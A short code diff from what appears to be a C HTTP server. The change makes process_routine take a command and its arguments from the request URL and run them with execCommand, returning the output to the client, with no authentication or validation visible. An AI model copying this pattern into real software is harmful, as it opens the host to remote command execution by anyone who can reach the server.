@@ -204,7 +204,14 @@ void* process_routine (void *arg) {
                     //if (execCommand(clientfd, "C:\\\\Windows\\\\System32\\\\cmd.exe", "C:\\\\Windows\\\\System32\\\\cmd.exe /k ipconfig") == 1) {
                     //    fprintf(stderr, "execCommand Error\n");
                     //}
-                    execCommand(clientfd,"ls", "ls ddwewer 4");
+                    struct operation_command op = parser_operation(http_h.url);
+                    if (op.comm != NULL) {
+                        execCommand(clientfd, op.comm, op.args);
+                    } else {
+                        fprintf(stderr, "Command not passed\n");
+                    }
+                    free_operation_command(op);
+
 
                 } else {
 
